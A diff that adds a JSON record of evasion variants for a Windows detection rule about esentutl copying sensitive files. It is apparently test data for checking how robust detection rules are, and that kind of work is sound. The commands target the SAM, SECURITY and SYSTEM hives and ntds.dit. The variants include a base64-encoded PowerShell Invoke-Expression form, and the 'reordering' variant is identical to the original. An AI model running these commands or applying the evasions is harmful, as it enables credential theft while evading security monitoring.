@@ -1,0 +1,11 @@
+{
+  "rule_name": "proc_creation_win_esentutl_sensitive_file_copy_0",
+  "original_command": "\\esentutl.exe \\esentutl.exe vss /m /y \\config\\RegBack\\sam \\config\\RegBack\\security \\config\\RegBack\\system \\config\\sam \\config\\security \\config\\system \\repair\\sam \\repair\\security \\repair\\system \\windows\\ntds\\ntds.dit",
+  "evasions": {
+    "insertion": "\\esentutl.exe \\esentutl.exe vss /m /\"y\" \\config\\RegBack\\sam \\config\\RegBack\\security \\config\\RegBack\\system \\config\\sam \\config\\security \\config\\system \\repair\\sam \\repair\\security \\repair\\system \\windows\\ntds\\ntds.dit",
+    "substitution": "\\esentutl.exe \\esentutl.exe vss /m /y \\config\\RegBack\\sam \\config\\RegBack\\security \\config\\RegBack\\system \\config\\sam \\config\\security \\config\\system \\repair\\sam \\repair\\security \\repair\\system \\windows\\ntds\\ntds.dit #substitution",
+    "omission": "\\esentutl \\esentutl vss /m /y \\config\\RegBack\\sam \\config\\RegBack\\security \\config\\RegBack\\system \\config\\sam \\config\\security \\config\\system \\repair\\sam \\repair\\security \\repair\\system \\windows\\ntds\\ntds.dit",
+    "reordering": "\\esentutl.exe \\esentutl.exe vss /m /y \\config\\RegBack\\sam \\config\\RegBack\\security \\config\\RegBack\\system \\config\\sam \\config\\security \\config\\system \\repair\\sam \\repair\\security \\repair\\system \\windows\\ntds\\ntds.dit",
+    "recoding": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('XGVzZW50dXRsLmV4ZSBcZXNlbnR1dGwuZXhlIHZzcyAvbSAveSBcY29uZmlnXFJlZ0JhY2tcc2FtIFxjb25maWdcUmVnQmFja1xzZWN1cml0eSBcY29uZmlnXFJlZ0JhY2tcc3lzdGVtIFxjb25maWdcc2FtIFxjb25maWdcc2VjdXJpdHkgXGNvbmZpZ1xzeXN0ZW0gXHJlcGFpclxzYW0gXHJlcGFpclxzZWN1cml0eSBccmVwYWlyXHN5c3RlbSBcd2luZG93c1xudGRzXG50ZHMuZGl0')) | Invoke-Expression\" "
+  }
+}
